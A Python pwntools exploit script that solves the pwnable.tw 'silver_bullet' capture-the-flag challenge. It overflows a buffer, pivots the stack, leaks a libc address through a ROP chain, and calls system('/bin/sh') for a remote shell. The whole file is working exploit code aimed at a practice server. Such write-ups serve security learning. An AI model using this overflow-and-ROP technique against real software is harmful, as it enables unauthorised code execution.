#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./silver_bullet_patched')
libc = ELF('./libc_32.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10103)

def create(data):
    sla('Your choice :', '1')
    sa('Give me your description of bullet :', data)

def powerup(data):
    sla('Your choice :', '2')
    sa('Give me your another description of bullet :', data)

def beat():
    sla('Your choice :', '3')

bss_buf = 0x804b310
leave_ret = 0x08048A18
pop_ebp_ret = 0x08048a7b
pop3_ret = 0x08048a79
pop2_ret = 0x08048a7a
pop_ret = 0x08048475
read_plt = elf.plt['read']
read_got = elf.got['read']
read_input = 0x080485EB
puts_plt = elf.plt['puts']

# overflow
create('A' * 0x2f)
powerup('B') # set length = 1 to overflow
payload = (
    '\xff\xff\xff' + # set length to beat wolf
    up32(0xdeadbeef) + 
    up32(read_input) + # call
    up32(pop2_ret) + # return address
    up32(bss_buf) + up32(0x01010101) + # args
    up32(pop_ebp_ret) + up32(bss_buf - 4) + up32(leave_ret) # stack pivot
)
#gdb.attach(p, 'b *0x080488DD\nc')
powerup(payload) # overflow
#gdb.attach(p, 'b *0x080487BF\nb *0x08048A18\nc')
beat()
ru('Oh ! You win !!\n')

# rop to leak
rop = (
    up32(puts_plt) + up32(pop_ret) + up32(read_got) +  # leak libc
    up32(read_plt) + up32(pop3_ret) + up32(0) + up32(bss_buf + 0x20) + up32(0x100) # read next rop
)
input('@')
s(rop)
read = uu32(r(4))
info('read = ' + hex(read))
libc_base = read - 0xd41c0
info('libc_base = ' + hex(libc_base))
system = libc_base + libc.sym['system']
info('system = ' + hex(system))
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
info('binsh = ' + hex(binsh))

# rop to get shell
rop = (
    up32(system) + up32(0xdeadbeef) + up32(binsh) # get shell
)
input('@')
s(rop)

p.interactive()

